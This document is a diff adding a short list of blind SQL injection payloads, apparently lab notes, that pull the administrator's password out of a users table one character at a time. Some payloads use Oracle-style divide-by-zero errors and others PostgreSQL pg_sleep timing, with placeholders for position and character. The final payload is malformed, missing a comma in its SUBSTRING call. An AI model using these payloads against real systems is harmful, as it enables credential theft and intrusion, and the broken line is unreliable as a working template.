@@ -1,0 +1,10 @@
+'||(SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))<1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
+
+'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator')||'
+
+'||(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),{i},1)='{char}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
+
+
+'||CASE WHEN ((LENGTH((SELECT password FROM users WHERE username='administrator')))={i}) THEN pg_sleep(2) ELSE NULL END--
+
+'||CASE WHEN ((SUBSTRING((SELECT password FROM users WHERE username='administrator')){i},1)='{char}') THEN pg_sleep(2) ELSE NULL END--
